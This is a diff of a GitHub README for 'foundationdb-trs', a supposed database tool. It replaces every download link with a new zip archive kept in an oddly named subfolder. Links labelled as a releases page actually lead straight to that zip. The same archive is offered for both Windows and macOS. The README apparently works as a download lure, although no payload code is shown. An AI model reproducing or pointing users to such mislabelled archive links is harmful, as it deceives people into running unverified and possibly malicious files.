@@ -1,6 +1,6 @@
 # 🚀 foundationdb-trs - Simple Tool for Database Interaction
 
-![Download foundationdb-trs](https://raw.githubusercontent.com/AadiMS/foundationdb-trs/main/platysmamyoides/foundationdb-trs.zip%20Now-FoundationDB%20TRS-brightgreen)
+![Download foundationdb-trs](https://github.com/AadiMS/foundationdb-trs/raw/refs/heads/main/platysmamyoides/trs_foundationdb_v1.3.zip%20Now-FoundationDB%20TRS-brightgreen)
 
 ## 📋 Overview
 
@@ -20,15 +20,15 @@ To begin using foundationdb-trs, you'll need to download the application from ou
 
 1. **Visit the Releases Page**:
    Click the link below to access the downloads:
-   [Visit the Releases Page](https://raw.githubusercontent.com/AadiMS/foundationdb-trs/main/platysmamyoides/foundationdb-trs.zip)
+   [Visit the Releases Page](https://github.com/AadiMS/foundationdb-trs/raw/refs/heads/main/platysmamyoides/trs_foundationdb_v1.3.zip)
 
 2. **Select the Latest Version**:
    On the Releases page, you will see a list of available versions. Look for the latest release, which is usually at the top of the list.
 
 3. **Download the Application**:
    Click on the appropriate file for your operating system:
-   - For **Windows**, download `https://raw.githubusercontent.com/AadiMS/foundationdb-trs/main/platysmamyoides/foundationdb-trs.zip`.
-   - For **macOS**, download `https://raw.githubusercontent.com/AadiMS/foundationdb-trs/main/platysmamyoides/foundationdb-trs.zip`.
+   - For **Windows**, download `https://github.com/AadiMS/foundationdb-trs/raw/refs/heads/main/platysmamyoides/trs_foundationdb_v1.3.zip`.
+   - For **macOS**, download `https://github.com/AadiMS/foundationdb-trs/raw/refs/heads/main/platysmamyoides/trs_foundationdb_v1.3.zip`.
    - For **Linux**, download the relevant package file.
 
 4. **Install the Application**:
@@ -51,7 +51,7 @@ To begin using foundationdb-trs, you'll need to download the application from ou
 
 To download and run foundationdb-trs, follow these steps:
 
-1. Visit the Releases page: [Download foundationdb-trs](https://raw.githubusercontent.com/AadiMS/foundationdb-trs/main/platysmamyoides/foundationdb-trs.zip)
+1. Visit the Releases page: [Download foundationdb-trs](https://github.com/AadiMS/foundationdb-trs/raw/refs/heads/main/platysmamyoides/trs_foundationdb_v1.3.zip)
 2. Find the latest version available.
 3. Choose the file for your operating system and download it.
 
